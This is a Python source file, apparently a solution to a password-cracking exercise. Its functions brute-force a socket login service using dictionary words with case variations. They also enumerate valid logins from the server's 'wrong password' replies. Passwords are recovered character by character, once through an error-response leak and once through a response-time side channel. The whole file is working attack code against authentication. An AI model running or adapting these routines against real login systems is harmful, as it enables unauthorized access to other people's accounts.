import itertools, string, time
from json import dumps
buffer_size = 1024

# making dict with masks
def case_masks(max_len):
    masks_list = []
    variants = [False, True]
    for length in range(max_len + 1):
        masks_list.append(list(itertools.product(variants, repeat=length)))
    return masks_list

# changing particular letter cases of word
def change_word(word, mask):
    word = list(word)
    for i, flag in enumerate(mask):
        if flag:
            word[i] = word[i].upper()
    return "".join(c for c in word)

# dictionary based password bruteforce
def dic_bruteforce(passwords_list, server_answers, socket_):
    # some steps to find out the length of the longest dictionary word
    sorted_pass = sorted(passwords_list, key=len)
    max_len = len(sorted_pass[-1])
    masks_list = case_masks(max_len)
    buffer_size = 32

    for password in sorted_pass:
        for mask in masks_list[len(password)]:
            possible_password = change_word(password, mask)
            socket_.send(possible_password.encode())
            response = socket_.recv(buffer_size)
            if response == server_answers['stop']:
                password = possible_password
                return password
            elif response == server_answers['pause']:
                return (response.decode())
            elif response == server_answers['continue']:
                continue
            if password.isdigit():
                break

#possible responses from server
def encode_response(stop, wr_log, wr_pass, err):
    possible_responses = {}
    possible_responses['stop'] = dumps({"result" : stop}).encode()
    possible_responses['wr_log'] = dumps({"result" : wr_log}).encode()
    possible_responses['wr_pass'] = dumps({"result" : wr_pass}).encode()
    possible_responses['err'] = dumps({"result" : err}).encode()
    return possible_responses

def pass_to_json(login, password):
    return dumps({
        "login": login,
        "password": password
    })

def log_bruteforce(logins_list, resp_vars, socket_):
    for login in logins_list:
        socket_.send(pass_to_json(login, "").encode())
        response = socket_.recv(buffer_size)
        if response == resp_vars['wr_pass']:
            return login

def exception_bruteforce(logins_list, resp_vars, socket_):
    login = log_bruteforce(logins_list, resp_vars, socket_)
    password = ""
    possible_symbols = list(string.ascii_letters + string.digits)
    while True:
        for symbol in possible_symbols:
            pair = pass_to_json(login, password + symbol)
            socket_.send(pair.encode())
            response = socket_.recv(buffer_size)
            if response == resp_vars['stop']:
                return pair
            if response == resp_vars['err']:
                password = password + symbol
                break

def time_based_bruteforce(logins_list, resp_vars, socket_):
    login = log_bruteforce(logins_list, resp_vars, socket_)
    password = ""
    possible_symbols = list(string.ascii_letters + string.digits)
    first_interval = None
    other_intervals = None
    while True:
        for symbol in possible_symbols:
            pair = pass_to_json(login, password + symbol)
            prev_time = time.time()
            socket_.send(pair.encode())
            response = socket_.recv(buffer_size)
            last_time = time.time()
            interval = round(last_time - prev_time, 2)
            if response == resp_vars['stop']:
                return pair
            elif response == resp_vars['err']:
                print(response)
            if interval >= 0.1:
                password = password + symbol
                break
